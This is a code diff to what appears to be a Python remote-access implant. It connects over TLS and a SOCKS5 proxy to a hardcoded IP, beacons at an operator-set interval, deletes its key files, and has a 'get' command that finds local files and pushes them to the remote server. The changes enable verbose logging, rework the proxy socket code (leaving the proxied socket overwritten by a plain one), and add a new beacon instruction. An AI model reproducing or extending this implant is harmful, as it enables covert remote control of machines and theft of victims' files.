@@ -12,7 +12,7 @@ remote_port = 8081
 proxy_ip = '95.216.33.245'
 proxy_port = 10250
 server_sni_hostname = ''
-VERBOSE = False
+VERBOSE = True
 DEVNULL = subprocess.DEVNULL
 BEACON_INTERVAL = 10    #in seconds
 
@@ -162,12 +162,12 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
     context.check_hostname = False
     context.load_cert_chain(certfile='client_cert', keyfile='client_key')
     delete_keys()
-    #s = socks.socksocket()
-    #s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
-    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
-    socket.socket = socks.socksocket
     s = socks.socksocket()
+    s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+    #socket.socket = socks.socksocket
+    #s = socks.socksocket()
     conn = context.wrap_socket(s, server_side=False)
     try:
         if VERBOSE:
@@ -175,8 +175,10 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
         conn.connect((remote_ip, remote_port))
         if VERBOSE:
             print_good("Connected!")
-    except:
+    except ConnectionRefusedError:
         raise ConnectionRefusedError
+    except socks.GeneralProxyError: 
+        raise socks.GeneralProxyError("Connection closed unexpectedly")
     if VERBOSE:
         print_good("SSL established. Peer: {}".format(conn.getpeercert()))
 
@@ -202,6 +204,11 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             elif temp.isdigit():
                 BEACON_INTERVAL = int(data.strip("[BEACON]"))
                 send_data(conn, "Beacon Setting: {}".format(BEACON_INTERVAL))
+            elif temp == "START":
+                if VERBOSE:
+                    print_info("Received Beacon Instruction")
+                conn.close()
+                raise ConnectionResetError
         elif "get" in data:  #find file locally then push to remote server
             if VERBOSE:
                 print_info("Received GET")
@@ -254,7 +261,8 @@ def main ():
                 print(e)
         finally:
             delete_keys()
-            print_info("Sleeping for {}".format(BEACON_INTERVAL))
+            if VERBOSE:
+                print_info("Sleeping for {}".format(BEACON_INTERVAL))
             sleep(BEACON_INTERVAL)
             
 
